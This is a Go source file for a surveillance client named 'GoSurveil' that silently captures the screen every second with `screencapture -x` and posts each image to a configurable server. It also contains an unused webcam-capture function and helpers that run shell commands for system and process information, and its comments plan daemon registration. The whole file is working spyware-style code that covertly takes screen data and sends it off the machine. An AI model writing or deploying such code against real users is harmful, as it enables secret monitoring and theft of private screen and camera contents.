/*

Client Library for Computer Survilliance Written in GO


 TODO

 - Segment User ID

 - Wait Period
 For example: ./client -w 30  # for 30 seconds to wait for another set of requests.

*/

package main

import (
	"fmt"
	"github.com/codegangsta/cli"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"time"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func main() {

	app := cli.NewApp()
	app.Name = "GoSurveil Client"
	app.Usage = "your computer is listening"

	app.Version = "0.1"
	app.Author = "Ivan Acosta-Rubio"
	app.Email = "@ivanacostarubio"

	app.Flags = []cli.Flag{
		cli.StringFlag{
			Name:  "server",
			Value: "http://127.0.0.1:8000",
			Usage: "The server were we send the data",
		},
	}

	app.Action = func(c *cli.Context) {

		host := c.String("server")
		mainLoop(host)
	}

	app.Run(os.Args)
}

func mainLoop(host string) {
	for {
		// Register as a Daemon OSX
		// Check for update
		httpPost(screenCapture(), host)
		//		httpPost(facetime(), host)
		time.Sleep(1 * time.Second)
	}
}

func facetime() string {

	_, err := exec.Command("sh", "-c", "./imagesnap ./tmp/hello.jpg").Output()
	if err != nil {
		log.Fatal(err)
	}

	dat, err := ioutil.ReadFile("./tmp/hello.jpg")
	check(err)
	return string(dat)
}

func screenCapture() string {

	_, err := exec.Command("sh", "-c", "screencapture -x ./tmp/mailme.jpg").Output()

	if err != nil {
		log.Fatal(err)
	}

	dat, err := ioutil.ReadFile("./tmp/mailme.jpg")
	check(err)
	return string(dat)
}

func topInfo() string {
	return abstractCommand("top -l 1 -o cpu -n 10")
}

func userInfo() string {
	return abstractCommand("uname -a")
}

func abstractCommand(c string) string {

	out, err := exec.Command("sh", "-c", c).Output()

	if err != nil {
		log.Fatal(err)
	}

	return string(out)
}

func httpPost(data string, host string) {

	resp, err := http.PostForm(host, url.Values{"message": {data}, "numero": {"123"}})

	if err != nil {
		log.Print(err)
		fmt.Println("E \n %s", resp)
	} else {
		fmt.Print(".")
	}

}
